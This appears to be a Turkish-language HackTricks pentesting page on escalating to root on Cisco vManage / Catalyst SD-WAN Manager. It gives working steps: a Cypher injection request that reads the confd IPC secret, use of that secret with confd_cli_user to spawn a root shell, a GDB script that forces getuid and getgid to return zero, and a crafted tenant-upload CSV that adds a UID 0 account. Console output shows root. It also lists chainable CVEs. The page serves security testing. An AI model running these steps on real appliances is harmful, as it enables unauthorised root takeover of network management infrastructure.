# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Cisco vManage / *Catalyst SD-WAN Manager* üzerinde `vmanage`, `netadmin` veya `vmanage-admin` olarak code execution elde ettiğinizde, en ilgi çekici yerel privesc yüzeyleri genellikle `confd` CLI stack'i, `cmdptywrapper` helper'ı, localhost REST API'leri ve root-owned import/upload handler'larıdır.

Bir controller üzerinde hâlâ **initial foothold**'a ihtiyacınız varsa, önce özel control-plane sayfasına bakın:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Hızlı yerel triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Eğer `/etc/confd/confd_ipc_secret` dosyası foothold'unuzdan okunabiliyorsa, Path 1 ve Path 2 hemen uygulanabilir hâle gelir. Remote info leak veya bir webshell üzerinden erişim sağladıysanız, `vmanage-admin` SSH materyaline ya da multitenancy upload handler'larına zaten erişip erişemediğinizi de kontrol edin: 2026 araştırmaları, her ikisinin de gerçekçi başlangıç noktaları olduğunu gösterdi.

## Path 1

([https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html) kaynağından örnek)

`confd` ve farklı binary'lerle ilgili bazı [documentation](http://66.218.245.39/doc/html/rn03re18.html) üzerinde biraz inceleme yaptıktan sonra (Cisco web sitesinde bir hesapla erişilebilir), IPC socket'ini authenticate etmek için `/etc/confd/confd_ipc_secret` konumunda bulunan bir secret kullandığını keşfettik:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Neo4j örneğimizi hatırlıyor musun? `vmanage` kullanıcısının yetkileriyle çalışıyor ve bu nedenle önceki zafiyeti kullanarak dosyayı almamıza olanak tanıyor:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` programı command line arguments desteklemez, ancak `/usr/bin/confd_cli_user` programını arguments ile çağırır. Bu nedenle `/usr/bin/confd_cli_user` programını kendi arguments setimizle doğrudan çağırabiliriz. Ancak mevcut yetkilerimizle bu program okunabilir durumda değildir; bu yüzden onu rootfs'ten almamız ve scp kullanarak kopyalamamız, help çıktısını okumamız ve shell elde etmek için kullanmamız gerekir:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Yol 2

(Örnek: [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

Synacktiv ekibinin yazdığı blog¹, root shell elde etmek için zarif bir yöntem açıklıyordu; ancak bunun dezavantajı, yalnızca root tarafından okunabilen `/usr/bin/confd_cli_user` dosyasının bir kopyasını edinmeyi gerektirmesiydi. Böyle bir uğraşa gerek kalmadan root yetkisine yükselmenin başka bir yolunu buldum.

`/usr/bin/confd_cli` binary dosyasını disassemble ettiğimde aşağıdakini gözlemledim:

<details>
<summary>UID/GID toplamasını gösteren Objdump</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

“ps aux” çalıştırdığımda aşağıdakini gözlemledim (_not -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
“confd_cli” programının, giriş yapmış kullanıcıdan topladığı kullanıcı kimliğini ve grup kimliğini “cmdptywrapper” uygulamasına aktardığını varsaydım.

İlk denememde “cmdptywrapper” uygulamasını doğrudan çalıştırıp `-g 0 -u 0` değerlerini sağladım, ancak başarısız oldu. Görünüşe göre işlem sırasında bir yerde bir dosya tanımlayıcısı (`-i 1015`) oluşturuluyor ve bunu taklit edemiyorum.

synacktiv’in blogunda (son örnek) belirtildiği üzere, `confd_cli` programı command line argument desteklemiyor; ancak bir debugger ile onu etkileyebiliyorum ve neyse ki sistemde GDB bulunuyor.

`getuid` ve `getgid` API’lerini 0 döndürmeye zorladığım bir GDB scripti oluşturdum. Deserialization RCE üzerinden zaten “vmanage” privilege’ına sahip olduğum için `/etc/confd/confd_ipc_secret` dosyasını doğrudan okuma iznim var.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Console Çıktısı:

<details>
<summary>Konsol çıktısı</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3 (2025 CLI input validation bug - CVE-2025-20122)

Cisco daha sonra [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt) için yayımladığı kendi advisory'sinde daha temiz bir local root path belgeledi: **yalnızca read-only privileges sahibi authenticated attacker**, insufficient input validation nedeniyle manager CLI'ye crafted request göndererek root'a geçiş yapabiliyordu.

Offensive perspective açısından önemli çıkarım şudur:

1. Kutuda *herhangi* bir low-priv foothold elde ettiğinizde, daha ağır Path 1 / Path 2 workflow'una geçmeden önce local CLI service'i test etmelisiniz.
2. Trust boundary'yi bulmak için Path 2'deki artifact'leri yeniden kullanın: `confd_cli` → `cmdptywrapper` → `vshell`.
3. CLI backend'e forward edilen her field'ı şüpheli kabul edin: UID/GID, username, terminal metadata, imported files veya daha sonra root-owned bir helper tarafından tüketilen herhangi bir değer.
4. Low-priv bir user local CLI socket'e ulaşabiliyor ve bu field'ları etkileyebiliyorsa root, yalnızca bir crafted request uzağınızda olabilir.

Appliance'a eriştikten sonraki pratik workflow şöyledir:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Bu, 2025 bug'ını benzer sürümler için iyi bir hunting pattern haline getiriyor: **userland'de identity toplayıp bunu daha ayrıcalıklı bir wrapper'a ileten local CLI shim'lerini** arayın.

**CVE-2025-20122** ile daha sonraki **CVE-2026-20122**'yi karıştırmayın: 2025 sorunu *local* bir CLI-to-root bug'ı iken 2026 sorunu, çoğunlukla bir foothold yerleştirmek ve ardından Path 1 / Path 2 / Path 4'ü yeniden incelemek için yararlı olan *remote* bir API arbitrary file overwrite açığıdır.

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Cisco'nun Şubat 2026 advisory'si başka bir yararlı privesc sınıfı daha tanıttı: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v), REST API'deki yetersiz bir user-authentication mekanizması nedeniyle **authenticated, local ve low privileges sahibi bir attacker'ın** root elde etmesine izin veriyordu.

Bu önemlidir, çünkü vManage privesc artık yalnızca `confd`/TTY abuse ile sınırlı değildir. Bir low-priv shell elde ettikten sonra şunları da araştırın:

- caller'a gereğinden fazla güvenen localhost-only API endpoint'leri
- mevcut account tarafından okunabilen token'lar, cookie'ler veya service credential'ları
- `dataservice`/REST handler'ları üzerinden açığa çıkarılan ve local olarak hâlâ tetiklenebilen root-only action'lar

Pratikte, `vmanage` veya başka bir service user olarak shell elde ettiğinizde local API abuse, interactive CLI abuse'a kıyasla çoğu zaman daha sessizdir ve otomatikleştirilmesi daha kolaydır:
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Yerel session context ayrıcalıklı REST functionality'ye erişmek için yeterliyse API path'ini tercih edin: yeniden oynatmak, script'lerle çalıştırmak ve çalınmış web session'ları veya API token'larıyla zincirlemek daha kolaydır.

## Path 5 (2026 crafted file processed by root - CVE-2026-20245)

Yakın zamanda görülen başka bir pattern, [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx) örneğidir: `netadmin` yetkilerine sahip local attacker, CLI'ın daha sonra güvenli olmayan şekilde işlediği bir **crafted file** yükleyebilir ve bu da `root` olarak command injection'a yol açabilir.

HackTricks açısından değerli teknik, belirli CVE'den daha kapsamlıdır:

1. Dosya kabul eden her CLI veya web workflow'unu enumerate edin: import'lar, diagnostic bundle'lar, template'ler, validator'lar, backup'lar, tenant data'sı vb.
2. Yüklenen dosyanın nereye yerleştiğini ve hangi root-owned script veya binary'nin dosyayı tükettiğini takip edin.
3. Filename'in, file content'in veya parsed metadata'nın shell command'lara, wrapper script'lerine ya da `system()`-style helper'lara aktarılıp aktarılmadığını test edin.
4. `netadmin`'e zaten erişebiliyorsanız (geçerli credential'lar, çalınmış session veya bir auth-bypass chain), file-processing bug'ları çoğu zaman root'a ulaşmanın en hızlı yoludur.

Google Cloud / Mandiant daha sonra bu bug class'ının multitenancy import path üzerinden exploit edildiğine dair çok somut bir örnek gösterdi:
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
Gözlemlenen saldırıda, hazırlanmış CSV, geçici bir UID 0 hesabı (`troot`) oluşturmak için `/etc/passwd` ve `/etc/shadow` dosyalarını değiştirdi. Bu da `tenant-upload` / `tenant-list` tarzı importer'ları özellikle ilgi çekici kılıyor: Bunlar yalnızca veri alma özellikleri değil, potansiyel olarak root-owned parser front-end'leridir.

Hızlı bir shell-side hunting pattern şu şekildedir:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Bu bug sınıfı, `root` değil ancak `netadmin` yetkisi sağlayan remote foothold'larla özellikle iyi zincirlenir.

## Zincirleme kullanılabilecek diğer güncel vManage/Catalyst SD-WAN Manager açıkları

- **Unauthenticated info leak (CVE-2026-20133)** – Public research, bunun `confd_ipc_secret` veya `vmanage-admin` private key'ini açığa çıkarabildiğini gösterdiği için özellikle yüksek değer taşır; böylece bir read bug, ya Path 1'e ya da bir NETCONF pivot'una dönüşebilir.
- **Authenticated API arbitrary file overwrite (CVE-2026-20122)** – Yukarıdaki 2025 CLI bug'ından farklıdır; VulnCheck bunu bir webshell upload etmek için kullandı ve bu da bu sayfadaki local privesc yollarını doğrudan ilgili hâle getirir.
- **Authenticated UI XSS (CVE-2024-20475)** – Web UI'da bir admin session çalınabilir, ardından `vshell`'e veya yukarıdaki local privesc yollarından birine ulaşan API/CLI işlemlerine pivot yapılabilir.
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – Path 5 için çok güçlü bir precursor'dur; çünkü `netadmin`, 2026 crafted-file privesc için gereken tam yetki seviyesidir.
- **Authenticated arbitrary file write (CVE-2026-20262)** – Daha sonraki bir web UI upload path üzerinden gerçekleşmesi dışında CVE-2026-20122 ile benzer offensive value taşır: root veya management-plane web tier tarafından daha sonra parse edilecek bir konuma yazma imkânı sağlar.
- **Downgrade to resurrect old CLI privesc (CVE-2022-20775)** – 2026 intrusions, saldırganların eski ve vulnerable bir SD-WAN build'ine geri dönebildiğini, eski CLI root bug'ını abuse edebildiğini ve ardından orijinal version'ı geri yükleyebildiğini gösterdi.
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – Dedicated SD-WAN control-plane sayfasında daha iyi açıklanmıştır; `vmanage-admin` için bir SSH key ekleyerek bu sayfaya yeniden dönmek için gereken local foothold'u sağlar.



## References

- [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, vb.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager ve Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [VulnCheck: Herding Cats - Güncel Cisco SD-WAN Manager Vulnerabilities](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [Google Cloud / Mandiant: Cisco Catalyst SD-WAN Manager'daki Vulnerability'nin (CVE-2026-20245) Zero-Day Exploitation'ı](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
{{#include ../../banners/hacktricks-training.md}}
